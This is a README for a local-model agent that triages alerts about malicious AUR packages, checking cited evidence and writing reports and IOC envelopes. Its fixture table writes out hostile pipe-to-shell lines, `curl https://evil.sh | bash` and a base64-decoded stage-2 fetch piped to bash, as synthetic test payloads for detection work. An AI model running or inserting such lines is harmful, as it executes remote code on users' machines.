# trustsight-triage-agent

A **local-model** triage agent for TrustSight watcher alerts. It reads the
watcher feed, fetches the AUR evidence itself through MCP tool servers, and
asks a local model two narrow, cited questions per fired rule. The runtime
maps those answers to a class and writes a report, a verdict, and (for a
true positive) a confirmed-IOC envelope.

There is no opencode, no remote model gateway, no job container, and no
queue: one Python process, one local model.

## How it triages

Per rule, the runtime assembles a bundle (PKGBUILD, diff, decoded payloads,
AUR metadata, finding, rule card, rule source). The model is then asked, in
separate calls, so a 9B model never has to hold a whole verdict in one turn:

1. **SPLIT** - two binary, cited questions:
   - is there a bad practice behind this hit?
   - is there malicious behaviour in the package?
   The runtime maps the answers mechanically to `benign_false_positive`,
   `malicious_false_positive`, or `true_positive`. The model never names a
   class.
2. **SOLVE** - the class is an input. The model writes the remedy for that
   class only (owner and documentation for a benign FP, the detection-shape
   change plus its true-positive twin for a malicious FP, the malicious
   evidence and IOC list for a TP).
3. **ASSEMBLE** - `report.md`, `verdict.json`, an append-only ledger, and
   `alert.json` for a TP when `--alert` is on.

Three rules keep the split honest:

- A TP claim must quote the package, and the quote must appear in the
  evidence the runtime actually fetched.
- An alert at or above `--score-threshold` (default 20) cannot be called
  "not malicious" without a grounded citation. A missing answer is
  `uncertain`, never a quiet FP.
- A "malicious" answer must be backed by a concrete mechanism somewhere in
  the package evidence (execution, exfiltration, persistence). A model that
  hallucinates a pipe on a plain `curl -o` download is disputed to
  `uncertain`; it never becomes a TP or an alert.

The runtime also decodes `echo <base64> | base64 -d` payloads itself and puts
the plaintext in the bundle. A small model asked to eyeball base64 invents a
plausible plaintext; the runtime does the arithmetic.

The malicious-effect check is a floor, not a classifier: it never proves
malice, it only refuses a "yes" when the package contains no mechanism at
all. Extend its pattern list when a new true-positive shape appears.

## Requirements

- Python 3.12 and [uv](https://docs.astral.sh/uv/)
- A local OpenAI-compatible model endpoint. The validated setup is Ollama
  with Ornith 1.5 9B: see `agent/Modelfile.ornith` and `agent/README.md`.
- Sibling checkouts:
  - `trustsight/` - the watcher repo the rule cards, rule source and docs
    are read from, and the default checkout for the optional PR path
  - `trustsight-harness/` - the MCP server (`harness-mcp`) that provides
    AUR/feed/verification/alert tools

Expected layout (the parent is `TRIAGE_WORKSPACE`):

```
GitHub/
  trustsight/
  trustsight-harness/
  trustsight-triage-agent/   <- this repo
```

## Install

```sh
uv sync --extra dev

# Local model (once): see agent/README.md
ollama create ornith-9b-agent -f agent/Modelfile.ornith
# Ollama must listen beyond loopback for the compose route:
#   OLLAMA_HOST=0.0.0.0:11434 ollama serve
```

## Configure

Everything has a default; copy `.env.example` to `.env` only for overrides.

| variable | default | meaning |
|---|---|---|
| `TRIAGE_MODEL_BASE_URL` | `http://127.0.0.1:11434/v1` | OpenAI-compatible endpoint |
| `TRIAGE_MODEL_NAME` | `ornith-9b-agent:latest` | model tag |
| `TRIAGE_MODEL_API_KEY` | empty | bearer token, if the endpoint needs one |
| `TRIAGE_WORKSPACE` | `~/Documents/GitHub/trustsight` | parent of the sibling checkouts |
| `TRIAGE_STATE_DIR` | `~/.local/state/trustsight-triage` | ledger, pid, log, reports |
| `TRIAGE_ALERT` | off | `1` renders `alert.json` for TP verdicts |
| `TRIAGE_INTERVAL` | `300` | seconds between feed polls |
| `TRIAGE_LOCAL_MAX_TOKENS` | `4096` | output cap (the split is capped at 3000) |
| `TRIAGE_LOCAL_TEMPERATURE` | `0.6` | sampling temperature |
| `TRIAGE_LOCAL_CONTEXT` | `65536` | model context window |
| `TRIAGE_LOCAL_REASONING_EFFORT` | `none` | `none` disables a thinking model's reasoning turn |
| `TRIAGE_RBG_REPO` | `~/Documents/GitHub/harness` | optional second harness checkout for the legacy PR path; skipped when absent |

## Run

```sh
bin/triage-agent run                # foreground watcher (docker, systemd)
bin/triage-agent start              # background watcher, pid in the state dir
bin/triage-agent stop | status | logs [N]
bin/triage-agent once               # one poll, then exit
bin/triage-agent alert <slug>       # triage one live alert in the foreground
bin/triage-agent fixture <alert.json>

# direct, with the knobs
uv run python scripts/local_agent.py --mode triage \
    --alert-fixture tests/fixtures/alert_tp_synthetic.json --alert

# one poll
uv run python scripts/local_agent.py --mode triage --watch --once --alert
```

Useful flags: `--samples N` (independent split samples; all must agree),
`--score-threshold N`, `--max-rules N`, `--out-dir DIR`, `--mcp FILE` (a saved
MCP config such as `scripts/mcp.host.json`), `--interval N`.

### Docker

The compose stack is one service running the same watcher; the model stays on
the host:

```sh
cp .env.example .env    # optional overrides
docker compose up -d --build
docker compose logs -f
```

The container reaches ollama at `host.docker.internal:11434` (mapped to the
host gateway) and persists `/var/lib/triage` in a named volume. Host firewall
rules must allow the container subnet to reach the model port.

## Outputs

Under `$TRIAGE_STATE_DIR`:

```
triage.log
ledger.jsonl                     one line per triaged alert (slug, package, verdict)
reports/<slug>/<package>/
  bundle-<RULE>.txt              exact evidence the model saw
  verdict.json                   overall class, per-rule facts, citations, IOCs
  report.md                      human-readable table + reasoning
  alert.json                     TP only: trustsight.confirmed-ioc envelope
```

`alert.json` is the rendered envelope. Delivery (ntfy, signed feed) is not
part of this runtime; wire the envelope to your sink of choice.

## Fixtures and the A/B

`tests/fixtures/alert_tp_*.json` are alert fixtures with their own `tree`,
so they never touch the live AUR:

| fixture | truth | payload |
|---|---|---|
| `alert_tp_synthetic` | TP | `curl https://evil.sh \| bash` |
| `alert_tp_synthetic_benign` | benign twin | the same line as a plain `curl -o` download |
| `alert_tp_historical` | TP | `echo '<b64>' \| base64 -d \| bash` decoding to a stage-2 fetch |
| `alert_tp_historical_benign` | benign twin | the same encoding decoded to a file, not executed |

```sh
scripts/ab_tp_fixtures.sh            # all four at samples=1 and samples=2
```

The recorded 9B run in `tests/fixtures/ab-tp-results/` produced 4/4 TP at
both sample counts, both twins rejected as malicious false positives, and one
IOC (`evil.sh`) per alert. On these fixtures `samples=1` and `samples=2`
agree, so 1 is the default-cost choice; 2 is a reliability hedge for missing
answers.

`agent/README.md` records the 3B/4B model ladder measured on the same
fixtures and the context-size result (4k truncates and fails, 8k is the
minimum, 16-32k is safe).

## Test and lint

```sh
uv run ruff check .
uv run pytest -q
```

## Optional: FP-reproducer PR path

`--mode fix-pr --alert-fixture <alert.json>` runs the older per-rule
classify-and-fix flow: the runtime gathers evidence, the model returns
`code_fixes`, the fixes are gated (path allowlist, ASCII, size caps, clean
`git apply`), and `triage_agent.fix_pr` cuts a branch on a clone of the
watcher repo, commits, pushes and opens the PR with `gh`.

```sh
uv run python scripts/local_agent.py --mode fix-pr \
    --alert-fixture alert.json --no-push      # branch + commit only
```

It is local-model driven and independent of the triage route; it is not the
default and not needed for watcher triage.

## What this repo no longer contains

The opencode worker, dispatcher/queue, job containers, WARP rotation, GitHub
MCP server, model-profile rendering and signed-feed delivery were removed
with the opencode route. The local watcher above is the only agent.
